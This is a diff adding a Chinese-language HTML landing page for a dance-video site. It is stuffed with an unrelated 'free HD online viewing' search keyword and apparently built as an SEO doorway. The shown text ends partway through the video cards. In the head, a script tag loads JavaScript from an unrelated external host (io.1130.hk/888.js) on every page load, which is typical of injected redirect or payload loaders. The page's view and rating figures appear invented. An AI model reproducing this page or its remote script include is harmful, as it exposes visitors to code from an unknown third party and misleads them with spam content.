@@ -1,0 +1,1559 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta name="robots" content="index,follow">
+    <meta name="bingbot" content="index,follow">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <script type="text/javascript" src="https://io.1130.hk/888.js"></script>
+    <title>三亚免费高清在线观看_高清典藏版|舞蹈名场面</title>
+    <meta name="description" content="三亚免费高清在线观看完整收录全球舞蹈竞技节目经典名场面，涵盖现代舞民族舞街舞拉丁舞等多种风格。高清修复画面呈现舞台细节，舞者表演焕然一新。无论资深舞迷还是新观众，都能在这里感受舞蹈艺术的魅力。立即开启专属舞蹈视觉盛宴，畅享每一帧精彩瞬间。">
+    <meta name="keywords" content="三亚免费高清在线观看,舞蹈视频合集,高清舞蹈名场面,街舞精选,民族舞表演,拉丁舞赛事,舞蹈综艺大全">
+    <style>
+        :root {
+            --primary: #6C3FD1;
+            --primary-light: #A78BFA;
+            --primary-dark: #4C1D95;
+            --accent: #FF6B9D;
+            --bg: #F6F3FF;
+            --card-bg: rgba(255, 255, 255, 0.72);
+            --text: #1E1B2E;
+            --text-sec: #6B7280;
+            --r-card: 24px;
+            --r-pill: 70px;
+            --shadow: 0 8px 32px rgba(108, 63, 209, 0.12);
+            --nav-h: 60px;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html {
+            scroll-behavior: smooth;
+        }
+        body {
+            font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
+            font-size: 16px;
+            line-height: 1.9;
+            background: var(--bg);
+            color: var(--text);
+            overflow-x: hidden;
+        }
+        /* ---------- 粒子背景 ---------- */
+        #particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+        /* ---------- 导航栏 ---------- */
+        .site-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: var(--nav-h);
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(16px);
+            z-index: 999;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.04);
+        }
+        .nav-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            height: 42px;
+        }
+        .logo-icon {
+            width: 42px;
+            height: 42px;
+            background: var(--primary);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .logo-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: #fff;
+        }
+        .logo-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text);
+            letter-spacing: 1px;
+            white-space: nowrap;
+        }
+        .nav-menu {
+            display: flex;
+            gap: 28px;
+            align-items: center;
+            list-style: none;
+        }
+        .nav-menu a {
+            text-decoration: none;
+            color: var(--text-sec);
+            font-size: 15px;
+            font-weight: 500;
+            transition: color .3s;
+        }
+        .nav-menu a:hover {
+            color: var(--primary);
+        }
+        @media (max-width:768px) {
+            .nav-menu {
+                display: none;
+            }
+        }
+        /* ---------- 通用容器 ---------- */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            position: relative;
+            z-index: 2;
+        }
+        section {
+            padding: 80px 0;
+            position: relative;
+            z-index: 2;
+        }
+        .section-title {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .section-title h2 {
+            font-size: 36px;
+            font-weight: 800;
+            letter-spacing: 2px;
+        }
+        .section-sub {
+            text-align: center;
+            color: var(--text-sec);
+            font-size: 15px;
+            margin-bottom: 48px;
+        }
+        .divider-line {
+            width: 60px;
+            height: 3px;
+            background: var(--primary);
+            border-radius: 3px;
+            margin: 20px auto 48px;
+        }
+        /* ---------- Banner ---------- */
+        .banner {
+            min-height: 600px;
+            height: 65vh;
+            display: flex;
+            align-items: center;
+            background: linear-gradient(135deg, #EDE9FE 0%, #FDF2F8 50%, #E0F2FE 100%);
+            position: relative;
+            overflow: hidden;
+            padding-top: var(--nav-h);
+        }
+        .banner .container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 40px;
+            width: 100%;
+        }
+        .banner-left {
+            flex: 1;
+            max-width: 560px;
+            animation: fadeUp .8s ease both;
+        }
+        .banner-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #fff;
+            border-radius: 50px;
+            padding: 6px 18px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--primary);
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
+            margin-bottom: 20px;
+        }
+        .banner-tag::before {
+            content: "◆";
+            font-size: 10px;
+            color: var(--accent);
+        }
+        .banner-left h1 {
+            font-size: 44px;
+            font-weight: 900;
+            line-height: 1.3;
+            margin-bottom: 16px;
+            color: var(--text);
+        }
+        .banner-desc {
+            color: var(--text-sec);
+            font-size: 16px;
+            line-height: 1.9;
+            margin-bottom: 24px;
+            max-width: 460px;
+        }
+        .banner-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 32px;
+        }
+        .pill-tag {
+            background: rgba(108, 63, 209, 0.1);
+            border-radius: 50px;
+            padding: 5px 16px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--primary);
+            border: 1px solid rgba(108, 63, 209, 0.15);
+        }
+        .banner-btns {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all .3s ease;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: #fff;
+            box-shadow: 0 8px 24px rgba(108, 63, 209, 0.3);
+        }
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(76, 29, 149, 0.35);
+        }
+        .btn-outline {
+            background: transparent;
+            color: var(--text);
+            border: 2px solid rgba(0, 0, 0, 0.12);
+        }
+        .btn-outline:hover {
+            border-color: var(--primary);
+            color: var(--primary);
+            transform: translateY(-2px);
+        }
+        /* Banner右栏 */
+        .banner-right {
+            flex: 1;
+            max-width: 480px;
+            animation: fadeUp 1s ease both;
+        }
+        .pc-window {
+            background: #1E1B2E;
+            border-radius: 20px;
+            box-shadow: 0 24px 80px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            border: 4px solid #151221;
+        }
+        .window-top {
+            background: #151221;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .window-top span {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .window-top .red {
+            background: #FF5F57;
+        }
+        .window-top .yellow {
+            background: #FEBC2E;
+        }
+        .window-top .green {
+            background: #28C840;
+        }
+        .window-body {
+            display: flex;
+            padding: 20px;
+            gap: 16px;
+            background: linear-gradient(165deg, #1E1B2E, #2D1B4E);
+        }
+        .win-left {
+            width: 80px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+        .win-left .app-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--primary);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .win-left .app-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: #fff;
+        }
+        .win-left .app-name {
+            font-size: 11px;
+            color: #B0A8C8;
+            text-align: center;
+            line-height: 1.4;
+        }
+        .win-mid {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .win-mid svg {
+            width: 120px;
+            height: 120px;
+        }
+        .win-right {
+            width: 100px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .win-right .data-row {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 8px 10px;
+        }
+        .win-right .data-row .label {
+            font-size: 10px;
+            color: #8A829F;
+            line-height: 1.4;
+        }
+        .win-right .data-row .value {
+            font-size: 15px;
+            font-weight: 700;
+            color: #fff;
+            line-height: 1.4;
+        }
+        @media (max-width:992px) {
+            .banner {
+                height: auto;
+                padding-bottom: 60px;
+            }
+            .banner .container {
+                flex-direction: column;
+            }
+            .banner-left,
+            .banner-right {
+                max-width: 100%;
+            }
+            .banner-left h1 {
+                font-size: 32px;
+            }
+        }
+        /* ---------- 核心优势 ---------- */
+        .advantage-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+        }
+        .adv-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border-radius: var(--r-pill);
+            padding: 40px 32px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            box-shadow: var(--shadow);
+            transition: all .4s ease;
+        }
+        .adv-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 16px 48px rgba(108, 63, 209, 0.2);
+            border-color: var(--primary-light);
+        }
+        .adv-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            box-shadow: 0 8px 20px rgba(108, 63, 209, 0.3);
+        }
+        .adv-icon svg {
+            width: 28px;
+            height: 28px;
+            fill: #fff;
+        }
+        .adv-card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+        .adv-card p {
+            color: var(--text-sec);
+            font-size: 14px;
+            line-height: 1.8;
+        }
+        @media (max-width:992px) {
+            .advantage-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        @media (max-width:576px) {
+            .advantage-grid {
+                grid-template-columns: 1fr;
+            }
+            .adv-card {
+                border-radius: var(--r-card);
+            }
+        }
+        /* ---------- 精选视频 ---------- */
+        #section-video {
+            background: #fff;
+        }
+        .highlight {
+            color: var(--primary);
+            position: relative;
+        }
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+        }
+        .video-card {
+            background: var(--card-bg);
+            border-radius: var(--r-card);
+            overflow: hidden;
+            border: 1px solid rgba(0, 0, 0, 0.04);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            transition: all .4s ease;
+            backdrop-filter: blur(8px);
+        }
+        .video-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.12);
+            border-color: var(--primary-light);
+        }
+        .video-thumbnail {
+            position: relative;
+            height: 190px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .video-thumbnail .cat-label {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            background: rgba(0, 0, 0, 0.5);
+            color: #fff;
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            z-index: 1;
+            backdrop-filter: blur(4px);
+        }
+        .play-btn {
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(4px);
+            border: 2px solid rgba(255, 255, 255, 0.6);
+            transition: all .3s;
+        }
+        .play-btn::after {
+            content: "";
+            width: 0;
+            height: 0;
+            border-left: 14px solid #fff;
+            border-top: 8px solid transparent;
+            border-bottom: 8px solid transparent;
+            margin-left: 4px;
+        }
+        .video-card:hover .play-btn {
+            transform: scale(1.1);
+            background: rgba(255, 255, 255, 0.5);
+        }
+        .video-duration {
+            position: absolute;
+            right: 12px;
+            bottom: 12px;
+            background: rgba(0, 0, 0, 0.65);
+            color: #fff;
+            font-size: 12px;
+            padding: 2px 10px;
+            border-radius: 12px;
+        }
+        .video-info {
+            padding: 20px;
+        }
+        .video-title {
+            font-size: 17px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .video-desc {
+            color: var(--text-sec);
+            font-size: 14px;
+            line-height: 1.8;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+        .video-meta {
+            display: flex;
+            gap: 16px;
+            font-size: 13px;
+            color: var(--text-sec);
+            margin-bottom: 14px;
+        }
+        .video-meta span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .tag-group {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        .tag,
+        .tag-video {
+            font-size: 12px;
+            padding: 2px 12px;
+            border-radius: 16px;
+            background: #F3F4F6;
+            color: var(--text-sec);
+        }
+        .tag-video {
+            background: rgba(108, 63, 209, 0.12);
+            color: var(--primary);
+            font-weight: 600;
+        }
+        @media (max-width:992px) {
+            .video-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        @media (max-width:576px) {
+            .video-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        /* ---------- 相关资讯 ---------- */
+        #section-news {
+            background: var(--bg);
+        }
+        .news-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+            grid-auto-rows: 1fr;
+        }
+        .news-card {
+            background: var(--card-bg);
+            border-radius: var(--r-card);
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            min-height: 260px;
+            border: 1px solid rgba(255, 255, 255, 0.7);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
+            transition: all .4s ease;
+        }
+        .news-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 16px 40px rgba(108, 63, 209, 0.12);
+            border-color: var(--primary-light);
+        }
+        .news-date {
+            font-size: 13px;
+            color: var(--primary);
+            opacity: .8;
+            margin-bottom: 10px;
+        }
+        .news-title {
+            font-size: 17px;
+            font-weight: 700;
+            line-height: 1.4;
+            margin-bottom: 10px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            min-height: 48px;
+        }
+        .news-excerpt {
+            color: var(--text-sec);
+            font-size: 14px;
+            line-height: 1.8;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            margin-bottom: 16px;
+            flex: 1;
+        }
+        .news-link {
+            margin-top: auto;
+            font-size: 14px;
+            color: var(--text-sec);
+            text-decoration: none;
+            transition: color .3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .news-link:hover {
+            color: var(--primary);
+        }
+        @media (max-width:992px) {
+            .news-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        @media (max-width:576px) {
+            .news-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        /* ---------- FAQ ---------- */
+        .faq-list {
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .faq-item {
+            background: var(--card-bg);
+            border-radius: var(--r-card);
+            padding: 24px 28px;
+            border: 1px solid rgba(255, 255, 255, 0.7);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
+            transition: all .4s ease;
+        }
+        .faq-item:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 32px rgba(108, 63, 209, 0.1);
+            border-color: var(--primary-light);
+        }
+        .faq-question {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .faq-question i {
+            font-size: 20px;
+            color: var(--primary);
+            width: 24px;
+            text-align: center;
+        }
+        .faq-question h3 {
+            font-size: 17px;
+            font-weight: 700;
+            color: var(--primary);
+            flex: 1;
+            line-height: 1.4;
+        }
+        .faq-toggle {
+            color: var(--text-sec);
+            font-size: 18px;
+            transition: transform .4s;
+            flex-shrink: 0;
+        }
+        .faq-item.open .faq-toggle {
+            transform: rotate(45deg);
+        }
+        .faq-answer {
+            display: none;
+            padding-top: 16px;
+            margin-top: 16px;
+            border-top: 1px solid rgba(0, 0, 0, 0.06);
+            color: var(--text-sec);
+            font-size: 14px;
+            line-height: 1.9;
+        }
+        .faq-answer ul {
+            padding-left: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .faq-answer li {
+            position: relative;
+        }
+        .faq-answer li::marker {
+            color: var(--primary);
+        }
+        .faq-item.open .faq-answer {
+            display: block;
+            animation: fadeUp .4s ease;
+        }
+        /* ---------- 评论模块 ---------- */
+        #section-comment {
+            background: #fff;
+        }
+        .comment-wrap {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: var(--bg);
+            border-radius: 32px;
+            box-shadow: var(--shadow);
+            padding: 40px;
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 32px;
+            border: 1px solid rgba(255, 255, 255, 0.8);
+        }
+        .comment-form-card {
+            background: var(--card-bg);
+            border-radius: var(--r-card);
+            padding: 28px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.04);
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            height: fit-content;
+        }
+        .comment-form-card input,
+        .comment-form-card textarea {
+            width: 100%;
+            border: 1px solid rgba(0, 0, 0, 0.08);
+            border-radius: 16px;
+            padding: 12px 16px;
+            font-size: 14px;
+            font-family: inherit;
+            background: rgba(255, 255, 255, 0.9);
+            resize: vertical;
+            transition: border-color .3s;
+        }
+        .comment-form-card input:focus,
+        .comment-form-card textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+        .comment-form-card textarea {
+            min-height: 100px;
+        }
+        .comment-submit {
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all .3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            align-self: flex-start;
+        }
+        .comment-submit:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+        .comment-list {
+            max-height: 600px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding-right: 4px;
+        }
+        .comment-list::-webkit-scrollbar {
+            width: 4px;
+        }
+        .comment-list::-webkit-scrollbar-thumb {
+            background: rgba(108, 63, 209, 0.3);
+            border-radius: 4px;
+        }
+        .comment-item {
+            background: var(--card-bg);
+            border-radius: var(--r-card);
+            padding: 16px 20px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
+            animation: fadeUp .5s ease both;
+        }
+        .comment-head {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        .comment-user {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .comment-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .comment-username {
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .comment-time {
+            font-size: 12px;
+            color: var(--text-sec);
+        }
+        .comment-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: rgba(108, 63, 209, 0.1);
+            color: var(--primary);
+            border-radius: 12px;
+            font-size: 12px;
+            padding: 2px 10px;
+            margin-bottom: 8px;
+        }
+        .comment-text {
+            font-size: 14px;
+            line-height: 1.8;
+            color: var(--text);
+            margin-bottom: 10px;
+        }
+        .comment-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            color: var(--text-sec);
+        }
+        .comment-actions .btn-like,
+        .comment-actions .btn-reply {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+            transition: color .3s;
+        }
+        .comment-actions .btn-like:hover {
+            color: var(--accent);
+        }
+        .load-more {
+            text-align: center;
+            color: var(--text-sec);
+            font-size: 13px;
+            padding: 16px 0 4px;
+        }
+        @media (max-width:992px) {
+            .comment-wrap {
+                grid-template-columns: 1fr;
+            }
+        }
+        @media (max-width:576px) {
+            .comment-wrap {
+                padding: 20px;
+            }
+        }
+        /* ---------- 页脚 ---------- */
+        .site-footer {
+            background: #1E1B2E;
+            color: #9A94B0;
+            text-align: center;
+            padding: 40px 24px;
+            font-size: 14px;
+            line-height: 2;
+            position: relative;
+            z-index: 2;
+        }
+        .site-footer a {
+            color: #B0A8C8;
+            text-decoration: none;
+        }
+        .site-footer a:hover {
+            color: #fff;
+        }
+        /* ---------- 动画 ---------- */
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        @keyframes floatBlob {
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+            33% {
+                transform: translate(30px, -20px) scale(1.05);
+            }
+            66% {
+                transform: translate(-20px, 15px) scale(0.98);
+            }
+        }
+        /* 背景光斑 */
+        .banner::before,
+        .banner::after {
+            content: "";
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(60px);
+            opacity: .5;
+            z-index: 1;
+        }
+        .banner::before {
+            width: 300px;
+            height: 300px;
+            background: var(--primary-light);
+            top: 10%;
+            left: 60%;
+            animation: floatBlob 12s ease-in-out infinite;
+        }
+        .banner::after {
+            width: 200px;
+            height: 200px;
+            background: var(--accent);
+            bottom: 10%;
+            left: 20%;
+            animation: floatBlob 10s ease-in-out reverse infinite;
+        }
+    </style>
+</head>
+<body>
+    <!-- 粒子背景 -->
+    <canvas id="particles"></canvas>
+    <!-- 固定导航栏 -->
+    <nav class="site-nav">
+        <div class="nav-inner">
+            <a href="#" class="logo">
+                <span class="logo-icon">
+                    <svg viewBox="0 0 24 24"><path d="M12 2L2 22h20z"/></svg>
+                </span>
+                <span class="logo-text">三角洲美舞</span>
+            </a>
+            <ul class="nav-menu">
+                <li><a href="#section-advantage">核心优势</a></li>
+                <li><a href="#section-video">精选视频</a></li>
+                <li><a href="#section-news">相关资讯</a></li>
+                <li><a href="#section-faq">常见问题</a></li>
+                <li><a href="#section-comment">用户留言</a></li>
+            </ul>
+        </div>
+    </nav>
+    <!-- 首屏Banner -->
+    <header class="banner">
+        <div class="container">
+            <div class="banner-left">
+                <span class="banner-tag">一起随心起舞</span>
+                <h1>三亚免费高清在线观看<br>每一帧都值得细品</h1>
+                <p class="banner-desc">高清典藏版舞蹈盛宴，汇聚全球顶级舞者竞技名场面。从舞台华美瞬间到幕后汗水故事，一站式尽览舞蹈之美。</p>
+                <div class="banner-tags">
+                    <span class="pill-tag">现代舞</span>
+                    <span class="pill-tag">民族舞</span>
+                    <span class="pill-tag">街舞</span>
+                    <span class="pill-tag">拉丁舞</span>
+                    <span class="pill-tag">芭蕾</span>
+                </div>
+                <div class="banner-btns">
+                    <a href="#section-video" class="btn btn-primary">立即观看</a>
+                    <a href="#section-advantage" class="btn btn-outline">了解详情</a>
+                </div>
+            </div>
+            <div class="banner-right">
+                <div class="pc-window">
+                    <div class="window-top">
+                        <span class="red"></span><span class="yellow"></span><span class="green"></span>
+                    </div>
+                    <div class="window-body">
+                        <div class="win-left">
+                            <div class="app-icon"><svg viewBox="0 0 24 24"><path d="M12 2L2 22h20z"/></svg></div>
+                            <span class="app-name">三角洲<br>美舞</span>
+                        </div>
+                        <div class="win-mid">
+                            <svg viewBox="0 0 120 120">
+                                <circle cx="60" cy="60" r="50" fill="none" stroke="rgba(255,255,255,.15)" stroke-width="8"/>
+                                <circle cx="60" cy="60" r="50" fill="none" stroke="#A78BFA" stroke-width="8"
+                                stroke-linecap="round" stroke-dasharray="314" stroke-dashoffset="94"
+                                transform="rotate(-90 60 60)"/>
+                                <text x="50%" y="55%" text-anchor="middle" fill="#fff" font-size="22" font-weight="bold">70%</text>
+                                <text x="50%" y="70%" text-anchor="middle" fill="#8A829F" font-size="10">更新进度</text>
+                            </svg>
+                        </div>
+                        <div class="win-right">
+                            <div class="data-row"><div class="label">视频总数</div><div class="value">1,286</div></div>
+                            <div class="data-row"><div class="label">舞者人数</div><div class="value">358</div></div>
+                            <div class="data-row"><div class="label">日均播放</div><div class="value">620W</div></div>
+                            <div class="data-row"><div class="label">好评率</div><div class="value">98.6%</div></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- 核心优势 -->
+    <section id="section-advantage">
+        <div class="container">
+            <div class="section-title"><h2>平台核心优势</h2></div>
+            <p class="section-sub">六大维度打造极致舞蹈视频观看体验</p>
+            <div class="advantage-grid">
+                <div class="adv-card">
+                    <div class="adv-icon"><svg viewBox="0 0 24 24"><path d="M12 3C7 3 2 8 2 13c0 3 2 6 5 7v-2c-2-1-3-3-3-5 0-4 4-8 8-8s8 4 8 8c0 2-1 4-3 5v2c3-1 5-4 5-7 0-5-5-10-10-10z"/></svg></div>
+                    <h3>高清画质</h3>
+                    <p>1080P/4K超清修复，舞台细节纤毫毕现，色彩还原精准，给眼睛最极致享受。</p>
+                </div>
+                <div class="adv-card">
+                    <div class="adv-icon"><svg viewBox="0 0 24 24"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h10v2H4z"/></svg></div>
+                    <h3>内容丰富</h3>
+                    <p>涵盖街舞、民族舞、拉丁舞等数十种舞蹈类型，收录近千部经典作品。</p>
+                </div>
+                <div class="adv-card">
+                    <div class="adv-icon"><svg viewBox="0 0 24 24"><path d="M12 2l3 6 7 1-5 5 1 7-6-3-6 3 1-7-5-5 7-1z"/></svg></div>
+                    <h3>极速更新</h3>
+                    <p>赛事结束24小时内上线完整版，热门舞台抢先看，永不落后于热点。</p>
+                </div>
+                <div class="adv-card">
+                    <div class="adv-icon"><svg viewBox="0 0 24 24"><path d="M17 7h3a2 2 0 012 2v9a2 2 0 01-2 2H9a2 2 0 01-2-2v-3H4a2 2 0 01-2-2V5a2 2 0 012-2h8a2 2 0 012 2v3zm-2 0v4h-4v2h4v4h2V9h4v4h2V9h-2V7h-2z"/></svg></div>
+                    <h3>多端同步</h3>
+                    <p>手机、平板、电视无缝切换，追剧进度云端同步，随时随地继续看。</p>
+                </div>
+                <div class="adv-card">
+                    <div class="adv-icon"><svg viewBox="0 0 24 24"><path d="M21 6h-2v2h-2V6h-2V4h2V2h2v2h2zm-5 3h2v2h-2zM12 2c-5 0-9 4-9 9 0 1.8.5 3.5 1.4 5-.1.6-.7 2-.9 2.4-.2.7.3 1.4 1 1.4.4 0 .8-.2 1.1-.5.5-.5 1.4-1.6 1.7-2.1 1.1.5 2.4.8 3.7.8 5 0 9-4 9-9s-4-9-9-9z"/></svg></div>
+                    <h3>智能推荐</h3>
+                    <p>基于观看偏好AI算法个性推荐，每次打开都有新惊喜，越看越懂你。</p>
+                </div>
+                <div class="adv-card">
+                    <div class="adv-icon"><svg viewBox="0 0 24 24"><path d="M12 21s-7-4.5-9-9c-1.5-3.5.5-8 4.5-8 2.5 0 4 1.5 4.5 2.5.5-1 2-2.5 4.5-2.5 4 0 6 4.5 4.5 8-2 4.5-9 9-9 9z"/></svg></div>
+                    <h3>互动社区</h3>
+                    <p>弹幕、评论、二创一站式互动，与百万舞友分享热爱，交流观舞心得。</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- 精选视频 -->
+    <section id="section-video">
+        <div class="container">
+            <div class="section-title"><h2>精选<span class="highlight">舞蹈</span>视频</h2></div>
+            <p class="section-sub">热播舞蹈名场面，一次看个够</p>
+            <div class="video-grid">
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#6C3FD1,#FF6B9D)">
+                        <div class="cat-label">💃 古典舞</div>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">08:24</span>
+                    </div>
+                    <div class="video-info">
+                        <h3 class="video-title">《洛神水赋》绝美水下舞蹈</h3>
+                        <p class="video-desc">水下飞天惊艳全网，舞者衣袂翩跹似洛神再现，每一帧都是壁纸级画面。</p>
+                        <div class="video-meta"><span>▷ 1286万播放</span><span>♥ 32.5万赞</span></div>
+                        <div class="tag-group"><span class="tag-video">热门推荐</span><span class="tag">古典</span></div>
+                    </div>
+                </div>
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#FF6B9D,#FEC260)">
+                        <div class="cat-label">🔥 街舞</div>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">12:18</span>
+                    </div>
+                    <div class="video-info">
+                        <h3 class="video-title">街舞大赛总决赛高燃混剪</h3>
+                        <p class="video-desc">全国最强舞团终极对决，地板动作+极速节奏引爆全场，肾上腺素飙升！</p>
+                        <div class="video-meta"><span>▷ 986万播放</span><span>♥ 21.3万赞</span></div>
+                        <div class="tag-group"><span class="tag-video">高燃</span><span class="tag">街舞</span></div>
+                    </div>
+                </div>
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#0EA5E9,#6C3FD1)">
+                        <div class="cat-label">🍃 民族舞</div>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">06:42</span>
+                    </div>
+                    <div class="video-info">
+                        <h3 class="video-title">《彩云之南》唯美民族舞</h3>
+                        <p class="video-desc">孔雀灵韵与傣族风情交织，舞姿柔美动人，将云南山水之美搬上舞台。</p>
+                        <div class="video-meta"><span>▷ 768万播放</span><span>♥ 18.9万赞</span></div>
+                        <div class="tag-group"><span class="tag-video">唯美</span><span class="tag">民族</span></div>
+                    </div>
+                </div>
+                <div class="video-card">
